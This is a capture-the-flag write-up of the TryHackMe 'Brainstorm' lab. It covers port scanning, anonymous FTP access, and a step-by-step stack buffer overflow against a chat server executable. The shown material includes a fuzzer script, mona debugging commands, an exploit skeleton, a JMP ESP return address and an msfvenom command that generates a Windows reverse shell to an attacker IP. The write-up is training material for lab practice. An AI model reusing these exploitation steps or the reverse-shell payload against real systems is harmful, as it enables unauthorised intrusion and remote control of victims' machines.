---
layout: single
title: BrainStorm - TryHackMe (OSCP STYLE)
excerpt: "In this exciting challenge, we have to perform social engineering on a Windows executable that runs a Chat application, a very interesting machine that poses a few headaches."
date: 2023-06-06
classes: wide
header:
  teaser: /assets/images/brainstorm/portada.png
  teaser_home_page: true
categories:
  - TryHackMe
  - infosec
tags:
  - TryHackMe
  - BufferOverFlow
  - Reverse Engieneer
  - Windows
---
## Enumeration

We are going to be using the Nmap tool to scan the machine for possible vulnerabilities and obtain an initial access point.

The machine seems to have ICMP requests disabled, as when we send a ping, there is no response. However, if we use the following Nmap scan, we can see that it indicates the host is active.

![1]

Once we have ensured that we have connectivity with the host, we will perform the usual scan, but it is important to add the -Pn option to avoid ICMP requests.

```
sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.10.201.103 -oG allPorts
```

![2]

-   `sudo`: Runs the command with administrative privileges.
-   `nmap`: The command we are running.
-   `-p-`: Scans all ports.
-   `-sS`: Uses a SYN scan to determine the state of the ports.
-   `--min-rate 5000`: Sets the minimum packet sending rate to 5000 packets per second.
-   `--open`: Shows only open ports.
-   `-T5`: Sets the timing template to 5, which makes the scan faster but also more aggressive.
-   `-vvv`: Sets the verbosity level to 3, which provides more detailed output.
-   `-n`: Treats all hostnames as IPs, skipping DNS resolution.
-   `-Pn`: Skips host discovery by not sending an ICMP ping.
-   `10.10.44.157`: The IP address of the target machine to be scanned.
-   `-oG allPorts`: Outputs the results in the grepable format to a file named "allPorts".

We can see that the machine has 3 open ports, 21, 3389 and 9999.

With `nmap -sVC -p21,3389,9999 10.10.201.103` command we make a further scan in otehr to discover services and versions running on those ports


![3]

We found a ftp server in port 21 and Brainstorm chat in port 9999, the ftp-anon default script shows that the anonymous login is allowed, this means that we can connect theough ftp to this machine

![4]

We run a ls command a found chatserver executable

## Initial Access

We have a directory file called chatserver and if we remember the first enumeration with nmap, one of the ports is running Brainstorm chat, so we have to get the way to use this executable to get access to the system

If we try to connect trhough port 9999 we get access to the chat server

![5]

After trying some usual commands like dir, ls, help...... I noticed that the chat is interpreting my strings, so I started to send a lot of characters in order to find some restriction

![6]

The user name has a character limitation, so we can try to locally probe the .exe file in order to find out if this machine is vulnerable to buffer overflow atack

Through get command in ftp shell, we cand download the exe and the dll file

![7]

In a windows 7 machine with immunity debuger installed, we can analyzed them in order to find the buffer overflow, I used the BufferOverFlowPrep machine and I transfered the files through a simple http server with python

## BufferOverflow

I start fuzzing the application with fuzzer.py file

```
#!/usr/bin/env python3

import socket, time, sys

ip = ""

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

And it reports that the application crashed in 4700 bytes, we re-run the file to ensure that this is the real crash

![8]

Now we should create a pattern of a length of 400 bytes longer that the string that crashed the server, in our case 5100 bytes, so the command should be.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5100
```

![9]

We can use the same fuzzer script, to crash the app and find out the offset value, we just need to paste the generated pattern into the string value.

![10]

Re-run the chatserver application in immunity and launch the fuzzer.py exploit

![11]

In immunity debuger we need to search the distance where the application crashed to know the offset

Remember that we are using mona tool as in BufferOverflowPrep room

```
!mona findmsp -distance 5200
```

![12]

Now we have the offset value `4566`

With this value we can create the exploit.py:

```
import socket

ip = "10.10.163,104"
port = 9999

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

![13]

Re-run the chatserver application and throw the exploit with those new values, now we need to find out the bad characters

```
!mona bytearray -b "\x00"
```

![14]

With the above command we generate the bytearray.bin file, now we just need to paste those bad characters in our exploit.py file and compare the ESP address with the generated file

Also can generate them with this python script

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

![15]


Launch the new script and the appication should crash, if not execute the script a couple of times until the application crash

With the following mona command line we have to compare the previous bytearray.bin file with the ESP address that we found after the crash

![16]

![17]

The comparison reports Unmodified, this means that we didn't have bad chars here, with the application on this state we have to find a jump point

```
!mona jmp -r esp -cpb "\x00"
```

![18]

We'll select the first address `625014DF`

Remember that windows7 has Little Endian notation, we should write the address in reverse mode

Converted address: ``\xdf\x14\x50\x62

## Creating malicious Payload

We need to create a payload using msfvenom with the following parameters:

-p windows/shell_reverse_tcp: Indicates that we want a Windows reverse shell. LHOST LPORT: Specifies the IP and port it should connect to. 

EXITFUNC=thread: Ensures that all operations are performed in a child process, so when we crash the application, the parent process doesn't terminate (which could potentially cause a BSOD on the system).

-b: Specifies the badchars that should not be used in the payload. 

-f c: Requests the output in C code format.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.59.189 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

![19]

We should add this payload to our exploit

![20]

Like before, if the script doesn't work on first instance try to execute it multiple times

![21]

We got access to the machine as administrator


[1]:/assets/images/brainstorm/1.png
[2]:/assets/images/brainstorm/2.png
[3]:/assets/images/brainstorm/3.png
[4]:/assets/images/brainstorm/4.png
[5]:/assets/images/brainstorm/5.png
[6]:/assets/images/brainstorm/6.png
[7]:/assets/images/brainstorm/7.png
[8]:/assets/images/brainstorm/8.png
[9]:/assets/images/brainstorm/9.png
[10]:/assets/images/brainstorm/10.png
[11]:/assets/images/brainstorm/11.png
[12]:/assets/images/brainstorm/12.png
[13]:/assets/images/brainstorm/13.png
[14]:/assets/images/brainstorm/14.png
[15]:/assets/images/brainstorm/15.png
[16]:/assets/images/brainstorm/16.png
[17]:/assets/images/brainstorm/17.png
[18]:/assets/images/brainstorm/18.png
[19]:/assets/images/brainstorm/19.png
[20]:/assets/images/brainstorm/20.png
[21]:/assets/images/brainstorm/21.png
[22]:/assets/images/brainstorm/22.png
